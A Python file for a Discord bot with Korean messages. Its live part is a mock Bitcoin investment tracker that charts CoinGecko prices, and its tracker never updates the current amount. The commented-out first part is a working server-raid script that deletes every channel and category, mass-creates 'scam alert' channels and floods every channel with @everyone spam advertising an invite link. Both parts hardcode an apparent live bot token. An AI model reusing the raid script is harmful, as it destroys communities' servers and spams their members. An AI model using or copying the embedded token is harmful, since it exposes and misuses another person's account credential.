# import discord
# from discord.ext import commands

# intents = discord.Intents.default()
# intents.typing = False
# intents.presences = False

# bot = commands.Bot(command_prefix='!', intents=intents)

# @bot.event
# async def on_ready():
#     print(f'Bot is ready. Logged in as {bot.user.name}')
#     await bot.change_presence(activity=discord.Streaming(name=f'역시 사기치는게 좋아!', url='https://www.twitch.tv/pornhub'))

# @bot.command()
# async def delete(ctx):
#     guild = ctx.guild
#     channels = guild.channels
#     for channel in channels:
#         await channel.delete()
#     categories = guild.categories
#     for category in categories:
#         await category.delete()

# @bot.command()
# async def channel(ctx):
#     guild = ctx.guild
#     for _ in range(50):
#         await guild.create_text_channel('사기-경보-발령')

# @bot.command()
# async def message(ctx):
#     guild = ctx.guild
#     channels = guild.text_channels
#     for channel in channels:
#         for _ in range(50):
#             await channel.send('@everyone\n\ndiscord.gg/korin 가장 좋은 선택, 코린랜드.')

# bot.run('MTEwNjc4Mzc5OTIzODQ3NTgzOA.GGoZNH.H0VOhtOC87xNkzNrxFINtlHRN2ptiSZ7X8jOJw')

import discord
import requests
import asyncio
import time
import matplotlib.pyplot as plt
import io

client = discord.Client()

investment_amount = 0
current_amount = 0
btc_price_krw = 0
def get_bitcoin_price():
    try:
        response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=krw')
        data = response.json()
        btc_price_krw = data['bitcoin']['krw']
        return btc_price_krw
    except (requests.exceptions.RequestException, KeyError):
        return None

def get_bitcoin_info():
    try:
        response = requests.get('https://api.coingecko.com/api/v3/coins/bitcoin?localization=false&tickers=false&market_data=true&community_data=false&developer_data=false&sparkline=true')
        data = response.json()
        return data
    except requests.exceptions.RequestException:
        return None

@client.event
async def on_ready():
    print('Bot is ready.')
    # 초기 비트코인 가격 설정
    global btc_price_krw
    btc_price_krw = get_bitcoin_price()

@client.event
async def on_message(message):
    global investment_amount
    global current_amount
    global btc_price_krw

    if message.author == client.user:
        return

    if message.content.startswith('!비트코인'):
        if investment_amount > 0:
            await message.channel.send("이미 투자를 하였습니다.")
            return

        amount = int(message.content.split(' ')[1])
        investment_amount += amount
        current_amount += amount

        await message.channel.send(f"비트코인에 {amount}원을 투자하였습니다.")

    elif message.content.startswith('!현재주식'):
        if investment_amount == 0:
            await message.channel.send("아직 투자를 하지 않았습니다.")
            return

        difference = current_amount - investment_amount
        percentage_increase = (difference / investment_amount) * 100

        await message.channel.send(f"현재 투자금액: {investment_amount}원\n딴 금액: {difference}원\n투자 수익률: {percentage_increase}%")
    
    elif message.content.startswith('!현재가격'):
        bitcoin_info = get_bitcoin_info()
        price = bitcoin_info['market_data']['current_price']['krw']
        volume = bitcoin_info['market_data']['total_volume']['krw']
        chart_data = bitcoin_info['sparkline_in_7d']['price']

        # 차트 생성
        plt.plot(chart_data)
        plt.xlabel('Time')
        plt.ylabel('Price')
        plt.title('Bitcoin Price Chart (7 days)')
        plt.grid(True)

        # 이미지 파일로 저장
        buffer = io.BytesIO()
        plt.savefig(buffer, format='png')
        buffer.seek(0)

        # 디스코드에 이미지 전송
        file = discord.File(buffer, filename='chart.png')
        embed = discord.Embed(title='Bitcoin Price', description='Current Price and Volume', color=0xf7931a)
        embed.add_field(name='Price (KRW)', value=f'{price:,}', inline=False)
        embed.add_field(name='Volume (24h)', value=f'{volume:,}', inline=False)
        embed.set_image(url='attachment://chart.png')

        await message.channel.send(embed=embed, file=file)

async def update_bitcoin_price():
    await client.wait_until_ready()
    global btc_price_krw

    while not client.is_closed():
        btc_price_krw = get_bitcoin_price()
        await asyncio.sleep(600)

client.loop.create_task(update_bitcoin_price())
client.run('MTEwNjc4Mzc5OTIzODQ3NTgzOA.GGoZNH.H0VOhtOC87xNkzNrxFINtlHRN2ptiSZ7X8jOJw')
